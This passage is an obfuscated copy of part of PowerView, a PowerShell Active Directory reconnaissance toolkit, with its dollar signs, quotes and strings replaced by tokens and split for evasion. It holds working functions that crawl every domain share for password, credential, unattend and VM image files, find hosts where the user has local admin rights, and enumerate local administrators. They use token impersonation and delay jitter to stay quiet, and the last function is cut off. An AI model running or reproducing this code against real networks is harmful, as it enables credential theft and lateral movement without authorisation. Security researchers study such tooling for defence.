.SYNOPSIS

Searches for files matching specific criteria on readable shares
in the domain'+'.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, Find-InterestingFile, New-ThreadedFunction  

.DESCRIPTION

This function enumerate'+'s all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the available shares for each
machine with Get-NetShare. It will then use Find-InterestingFile on each
readhable share, searching for files marching specific criteria. If -Credential
is passed, then Invoke-UserImpersonation is used to impersonate the specified
user before enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr. Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER Include

Only return files/folders that match the specified array of strings,
i.e. @(*.doc*, *.xls*, *.ppt*)

.PARAMETER SharePath

Specifies one or more specific share paths to search, in the form YwWYwWCOMPUTERYwWShare

.PARAMETER ExcludedShares

Specifies share paths to exclude, default of CgIF1, AdmingIF1, PrintgIF1, IPCgIF1.

.PARAMETER LastAccessTime

Only return files with a LastAccessTime greater than this date value.

.PARAMETER LastWriteTime

Only return files with a LastWriteTime greater than this date value.

.PARAMETER CreationTime

Only return files with a CreationTime greater than this date value.

.PARAMETER OfficeDocs

Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

.PARAMETER FreshEXEs

Switch. Find .EXEs accessed within the last 7 days.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the search'+'er should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-InterestingDomainShareFile

Finds 41ainteresting41a files on the current domain.

.EXAMPLE

Find-InterestingDomainShareFile -ComputerName @(41awindows1.testlab.local41a,41awindows2.testlab.local41a)

Finds 41ainteresting41a files on readable shares on the specified systems.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aDEVYwWdfm.a41a, gIF1SecPassword)
Find'+'-DomainShare -Domain testlab.local -Credential gIF1Cred

Searches interesting files in the testlab.local domain using the specified alternate credentials.

.OUTPUTS

PowerView.FoundFile
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.FoundFile41a)]
    [CmdletBinding(DefaultParameterSetName = 41aFileSpecification41a)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDNSHostName41a)]
        [String[]]
        gIF1ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aOperatingSystem41a)]
        [String]
        gIF1ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(41aServicePack41a)]
        [String]
        gIF1ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(41aSiteName41a)]
        [String]
        gIF1ComputerSiteName,

        [Parameter(ParameterSetName = 41aFileSpecification41a)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aSearchTerms41a, 41aTerms41a)]
        [String[]]
        gIF1Include = @(41a*password*41a, 41a*sensitive*41a, 41a*admin*41a, 41a*login*41a, 41a*secret*41a, 41aunattend*.xml41a, 41a*.vmdk41a, 41a*creds*41a, 41a*credential*41a, 41a*.config41a),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern(41aYwWYwWYwWYwW41a)]
        [Alias(41aShare41a)]
        [String[]]
        gIF1SharePath,

        [String[]]
        gIF1ExcludedShares = @(41aCgIF141a, 41aAdmingIF141a, 41aPrintgIF141a, 41aIPCgIF141a),

        [Parameter(ParameterSetName = 41aFileSpecification41a)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        gIF1LastAccessTime,

        [Parameter(ParameterSetName = 41aFileSpecification41a)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        gIF1LastWriteTime,

        [Parameter(ParameterSetName = 41aFileSpecification41a)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        gIF1CreationTime,

        [Parameter(ParameterSetName = 41aOfficeDocs41a)]
        [Switch]
        gIF1OfficeDocs,

        [Parameter(ParameterSetName = 41aFreshEXEs41a)]
        [Switch]
        gIF1FreshEXEs,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScop'+'e = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,'+'

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        gIF1Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        gIF1Threads = 20
    )

    BEGIN {
        gIF1ComputerSearcherArguments = @{
            41aProperties41a = 41adnshostname41a
        }
        if (gIF1PSBoundParameters[41aComputerDomain41a]) { gIF1ComputerSearcherArguments[41aDomain41a] = gIF1ComputerDomain }
        if (gIF1PSBoundParameters[41aComputerLDAPFilter41a]) { gIF1ComputerSearcherArguments[41aLDAPFilte'+'r41a] = gIF1ComputerLDAPFilter }
        if (gIF1PSBoundParameters[41aC'+'omputerSearchBase41a]) { gIF1ComputerSearcherArguments[41aSearchBase41a] = gIF1ComputerSearchBase }
        if (gIF1PSBoundParameters[41aComputerOperatingSystem41a]) { gIF1ComputerSearcherArguments[41aOperatingSystem41a] = gIF1OperatingSystem }
        if (gIF1PSBoundParameters[41aComputerServicePack41a]) { gIF1ComputerSearcherArguments[41aServicePack41a] = gIF1ServicePack }
        if (gIF1PSBoundParameters[41aComputerSiteName41a]) { gIF1ComputerSearcherArguments[41aSiteName41a] = gIF1SiteName }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ComputerSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1ComputerSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1ComputerSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1ComputerSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1ComputerSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ComputerSearcherArguments[41aCredential41a] = gIF1Credential }

        if (gIF1PSBoundParameters[41aComputerName41a]) {
            gIF1TargetComputers = gIF1ComputerName
        }
        else {
            Write-Verbose 41a[Find-InterestingDomainShareFile] Querying computers in the domain41a
            gIF1TargetComputers = Get-DomainComputer @ComputerSearcherArguments U9B Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose Zfr[Find-InterestingDomainShareFile] TargetComputers length: gIF1(gIF1TargetComputers.Length)Zfr
        if (gIF1TargetComputers.Length -eq 0) {
            throw 41a[Find-InterestingDomainShareFile] No hosts found to enumerate41a
        }

        # the host enumeration block we41are using to enumerate all servers
        gIF1HostEnumBlock = {
            Param(gIF1ComputerName, gIF1Include, gIF1ExcludedShares, gIF1OfficeDocs, gIF1ExcludeHidden, gIF1FreshEXEs, gIF1CheckWriteAccess, gIF1TokenHandle)

            if (gIF1TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                gIF1Null = Invoke-UserImpersonation -TokenHandle gIF1TokenHandle -Quiet
            }

            ForEach (gIF1TargetComputer in gIF1ComputerName) {

                gIF1SearchShares = @()
                if (gIF1TargetComputer.StartsWith(41aYwWYwW41a)) {
     '+'               # if a share is passed as the server
                    gIF1SearchShares += gIF1TargetComputer
                }
                else {
                    gIF1Up = Test-Connection -Count 1 -Quiet -ComputerName gIF1TargetComputer
                    if (gIF1Up) {
                        # get the shares for this host and display what we find
                        gIF1Shares = Get-NetShare -ComputerName gIF1TargetComputer
                        ForEach (gIF1Share in gIF1Shares) {
                            gIF1ShareName = gIF1Share.Name
                            gIF1Path = 41aYwWYwW41a+gIF1TargetComputer+41aYwW41a+gIF1ShareName
                            # make sure we get a real share name back
                            if ((gIF1ShareName) -and (gIF1ShareName.Trim() -ne 41a41a)) {
                                # skip this share if it41as in the exclude list
                                if (gIF1ExcludedShares -NotContains gIF1ShareName) {
                                    # check if the user has access to this path
                                    try {
                                        gIF1Null = [IO.Directory]::GetFiles(gIF1Path)
                                        gIF1SearchShares += gIF1Path
                                    }
                                    catch {
                                        Write-Verbose Zfr[!] No access to gIF1PathZfr
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (gIF1Share in gIF1SearchShares) {
                    Write-Verbose ZfrSearching share: gIF1ShareZfr
                    gIF1SearchArgs = @{
                        41aPath41a = gIF1Share
                        41aInclude41a = gIF1Include
                    }
                    if (gIF1OfficeDocs) {
                        gIF1SearchArgs[41aOfficeDocs41a] = gIF1OfficeDocs
                    }
                    if (gIF1'+'FreshEXEs) {
                        gIF1SearchArgs[41aFreshEXEs41a] = gIF1FreshEXEs
                    }
                    if (gIF1LastAccessTime) {
                        gIF1SearchArgs[41aLastAccessTime41a] = gIF1LastAccessTime
                    }
                    if (gIF1LastWriteTime) {
                        gIF1SearchArgs[41aLastWriteTime41a] = gIF1LastWriteTime
                    }
                    if (gIF1CreationTime) {
                        gIF1SearchArgs[41aCreationTime41a] = gIF1CreationTime
                    }
                    if (gIF1CheckWriteAccess) {
                        gIF1SearchArgs[41aCheckWriteAccess41a] = gIF1CheckWriteAccess
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if (gIF1TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        gIF1LogonToken = gIF1Null
        if (gIF1PSBoundParameters[41aCredential41a]) {
            if (gIF1PSBoundParameters[41aDelay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {
                gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Cr'+'edential
            }
            else {
                gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential -Quiet
            '+'}
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (gIF1PSBoundParameters[41aDelay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {

            Write-Verbose Zfr[Find-InterestingDomainShareFile] Total number of hosts: gIF1(gIF1TargetComputers.count)Zfr
            Write-Verbose Zfr[Find-InterestingDomainShareFile] Delay: gIF1Delay, Jitter: gIF1JitterZfr
            gIF1Counter = 0
            gIF1RandNo = New-Object System.Random

            ForEach (gIF1TargetComputer in gIF1TargetComputers) {
                gIF1Counter = gIF1Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds gIF1RandNo.Next((1-gIF1Jitter)*gIF1Delay, (1+gIF1Jitter)*gIF1Delay)

                Write-Verbose Zfr[Find-InterestingDomainShareFile] Enumerating server gIF1TargetComputer (gIF1Counter of gIF1(gIF1TargetComputers.count))Zfr
                Invoke-Command -ScriptBlock gIF1HostEnumBlock -ArgumentList gIF1TargetComputer, gIF1Include, gIF1ExcludedShares, gIF1OfficeDocs, gIF1ExcludeHidden, gIF1FreshEXEs, gIF1CheckWriteAccess, gIF1LogonToken
            }
        }
        else {
            Write-Verbose Zfr[Find-InterestingDomainShareFile] Using threading with threads: gIF1ThreadsZfr

            # if we41are using threading, kick off the script block with New-ThreadedFunction
            gIF1ScriptParams = @{
                41aInclude41a = gIF1Include
                41aExcludedShares41a = gIF1ExcludedShares
                41aOfficeDocs41a = gIF1OfficeDocs
                41aExcludeHidden41a = gIF1ExcludeHidden
                41aFreshEXEs41a = gIF1FreshEXEs
                41aCheckWriteAccess41a = gIF1CheckWriteAccess
                41aTokenHandle41a = gIF1LogonToken
            }

            # if we41are using threading, kick off the script block with New-ThreadedFunction using the gIF1HostEnumBlock + params
            New-ThreadedFunction -ComputerName gIF1TargetComputers -ScriptBlock gIF1HostEnumBlock -ScriptParameters gIF1ScriptParams -Threads gIF1Threads
        }
    }

    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


function Find-LocalAdminAccess {
<#
.SYNOPSIS

Finds machines on the local domain where the current user has local administrator access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Test-AdminAccess, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and for each computer it checks if the current user
has local administrator access using Test-AdminAccess. If -Credential is passed,
then Invoke-UserImpersonation is used to impersonate the specified user
before enumeration, reverting after with Invoke-RevertToSelf.

Idea adapted from the local_admin_search_enum post module in Metasploit written by:
    41aBrandon McCann ZfrzeknoxZfr <bmccann[at]accuvant.com>41a
    41aThomas McCarthy ZfrsmilingraccoonZfr <smilingraccoon[at]gmail.com>41a
    41aRoyce Davis Zfrr3dyZfr <rdavis[at]accuvant.com>41a

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default be'+'havior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr. Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER CheckShareAccess

Switch. Only display found shares that the local user has access to.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMET'+'ER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-LocalAdminAccess

Finds machines in the current domain the current user has admin access to.

.EXAMPLE

Find-LocalAdminAccess -Domain dev.testlab.local

Finds machines in the dev.testlab.local domain the current user has admin access to.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Find-LocalAdminAccess -Domain testlab.local -Credential gIF1Cred

Finds machines in the testlab.local domain that the user with the specified -Credential
has admin access to.

.OUTPUTS

String

Computer dnshostnames the current user has administrative access to.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDNSHostName41a)]
        [String[]]
        gIF1ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aOperatingSystem41a)]
        [String]
        gIF1ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(41aServicePack41a)]
        [String]
        gIF1ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(41aSiteName41a)]
        [String]
        gIF1ComputerSiteName,

        [Switch]
        gIF1CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1Delay = 0,

   '+'     [ValidateRange(0.0, 1.0)]
        [Double]
        gIF1Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        gIF1Threads = 20
    )

    BEGIN {
        gIF1ComputerSearcherArguments = @{
            41aProperties41a = 41adnshostname41a
        }
        if (gIF1PSBoundParameters[41aComputerDomain41a]) { gIF1ComputerSearcherArguments[41aDomain41a] = gIF1ComputerDomain }
        if (gIF1PSBoundParameters[41aComputerLDAPFilter41a]) { gIF1ComputerSearcherArguments[41aLDAPFilter41a] = gIF1ComputerLDAPFilter }
        if (gIF1PSBoundParameters[41aComputerSearchBase41a]) { gIF1ComputerSearcherArguments[41aSearchBase41a] = gIF1ComputerSearchBase }
        if (gIF1PSBoundParameters[41aUnconstrained41a]) { gIF1ComputerSearcherArguments[41aUnconstrained41a] = gIF1Unconstrained }
        if (gIF1PSBoundParameters[41aComputerOperatingSystem41a]) { gIF1ComputerSearcherArguments[41aOperatingSystem41a] = gIF1OperatingSystem }
        if (gIF1PSBoundParameters[41aComputerServicePack41a]) { gIF1ComputerSearcherArguments[41aServicePack41a] = gIF1ServicePack }
        if (gIF1PSBoundParameters[41aComputerSiteName41a]) { gIF1ComputerSearcherArguments[41aSiteName41a] = gIF1SiteName }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ComputerSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1ComputerSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1ComputerSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1ComputerSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1ComputerSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ComputerSearcherArguments[41aCredential41a] = gIF1Credential }

        if (gIF1PSBoundParameters[41aComputerName41a]) {
            gIF1TargetComputers = gIF1ComputerName
        }
        else {
            Write-Verbose 41a[Find-LocalAdminAccess] Querying computers in the domain41a
            gIF1TargetComputers = Get-DomainComputer @ComputerSearcherArguments U9B Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose Zfr[Find-LocalAdminAccess] TargetComputers length: gIF1(gIF1TargetComputers.Length)Zfr
        if (gIF1TargetComputers.Length -eq 0) {
            throw 41a[Find-LocalAdminAccess] No hosts found to enumerate41a
        }

        # the host enumeration block we41are using to enumerate all servers
        gIF1HostEnumBlock = {
            Param(gIF1ComputerName, gIF1TokenHandle)

            if (gIF1TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                gIF1Null = Invoke-UserImpersonation -TokenHandle gIF1TokenHandle -Quiet
            }

            ForEach (gIF1TargetComputer in gIF1ComputerName) {
                gIF1Up = Test-Connection -Count 1 -Quiet -ComputerName gIF1TargetComputer
                if (gIF1Up) {
                    # check if the current user has local admin access to this server
                    gIF1Access = Test-AdminAccess -ComputerName gIF1TargetComputer
                    if (gIF1Access.IsAdmin) {
                        gIF1TargetComputer
                    }
                }
            }

            if (gIF1TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        gIF1LogonToken = gIF1Null
        if (gIF1PSBoundParameters[41aCredential41a]) {
  '+'          if (gIF1PSBoundParameters[41aDelay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {
                gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
            }
            else {
                gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if'+' (gIF1PSBoundParameters[41aDelay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {

            Write-Verbose Zfr[Find-LocalAdminAccess] Total number of hosts: gIF1(gIF1TargetComputers.count)Zfr
            Write-Verbose Zfr[Find-LocalAdminAccess] Delay: gIF1Delay, Jitter: gIF1JitterZfr
            gIF1Counter = 0
            gIF1RandNo = New-Object System.Random

            ForEach (gIF1TargetComputer in gIF1TargetComputers) {
                gIF1Counter = gIF1Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds gIF1RandNo.Next((1-gIF1Jitter)*gIF1Delay, (1+gIF1Jitter)*gIF1Delay)

                Write-Verbose Zfr[Find-LocalAdminAccess] Enumerating server gIF1TargetComputer (gIF1Counter of gIF1(gIF1TargetComputers.count))Zfr
                Invoke-Command -ScriptBlock gIF1HostEnumBlock -ArgumentList gIF1TargetComputer, gIF1LogonToken
            }
        }
        else {
            Write-Verbose Zfr[Find-LocalAdminAccess] Using threading with threads: gIF1ThreadsZfr

            # if we41are using threading, kick off the script block with New-ThreadedFunction
            gIF1ScriptParams = @{
                41aTokenHandle41a = gIF1LogonToken
            }

            # if we41are '+'using threading, kick off the script block with New-ThreadedFunction using the gIF1HostEnumBlock + params
            New-ThreadedFunction -ComputerName gIF1TargetComputers -ScriptBlock gIF1HostEnumBlock -ScriptParameters gIF1ScriptParams -Threads gIF1Threads
        '+'}
    }
}


function Find-DomainLocalGroupMember {
<#
.SYNOPSIS

Enumerates the members of specified local group (default administrators)
for all the tar'+'geted machines on the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetLocalGroupMember, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the members of the specified local
group (default of Administrators) for each machine using Get-NetLocalGroupMember.
By default, the API method is used, but this can be modified with 41a-Method winnt41a
to use the WinNT service provider.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr. Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER GroupName

The local group name to query for users. If not given, it defaults to ZfrAdministratorsZfr.

.PARAMETER Method

The collection method to use, defaults to 41aAPI41a, also accepts 41aWinNT41a.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainLocalGroupMember

Enumerates the local group memberships for all reachable machines in the current domain.

.EXAMPLE

Find-DomainLocalGroupMember'+' -Domain dev.testlab.local

Enumerates the local group memberships for all reachable machines the dev.testlab.local domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Find-DomainLocalGroupMember -Domain testlab.local -Credential gIF1Cred

Enumerates t'+'he local group memberships for all reachable machi'+'nes the dev.testlab.local
domain using the alternate credentials.

.OUTPUTS

PowerView.LocalGroupMember.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroupMember.WinNT

Custom PSObject with translated group property fields from WinNT results.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.LocalGroupMember.API41a)]
    [OutputType(41aPowerView.LocalGroupMember.WinNT41a)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDNSHostName41a)]
        [String[]]
        gIF1ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aOperatingSystem41a)]
        [String]
        gIF1ComputerOperatingSystem,

        [ValidateNotNullOrEmpt'+'y()]
        [Alias(41aServicePack41a)]
        [String]
        gIF1ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(41aSiteName41a)]
        [String]
        gIF1ComputerSiteName,

        [Parameter(ValueFromPipelineByPropertyName = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1GroupName = 41aAdministrators41a,

        [ValidateSet(41aAPI41a, 41aWinNT41a)]
        [Alias(41aCollectionMethod41a)]
        [String]
        gIF1Method = 41aAPI41a,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]'+'
        gIF1Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        gIF1Threads = 20
    )

    BEGIN {
        gIF1ComputerSearcherArguments = @{
            41aProperties41a = 41adnshostname41a
        }
        if (gIF1PSBoundParameters[41aComputerDomain41a]) { gIF1ComputerSearcherArguments[41aDomain41a] = gIF1ComputerDomain }
        if (gIF1PSBoundParameters[41aComputerLDAPFilter41a]) { gIF1ComputerSearcherArguments[41aLDAPFilter41a] = gIF1ComputerLDAPFilter }
        if (gIF1PSBoundParameters[41aComputerSearchBase41a]) { gIF1ComputerSearcherArguments[41aSearchBase41a] = gIF1ComputerSearchBase }
        if (gIF1PSBoundParameters[41aUnconstrained41a]) { gIF1ComputerSearcherArguments[41aUnconstrained41a] = gIF1Unconstrained }
        if (gIF1PSBoundParameters[41aComputerOperatingSystem41a]) { gIF1ComputerSearcherArguments[41aOperatingSystem41a] = gIF1OperatingSystem }
        if (gIF1PSBoundParameters[41aComputerServicePack41a]) { gIF1ComputerSearcherArguments[41aServicePack41a] = gIF1ServicePack }
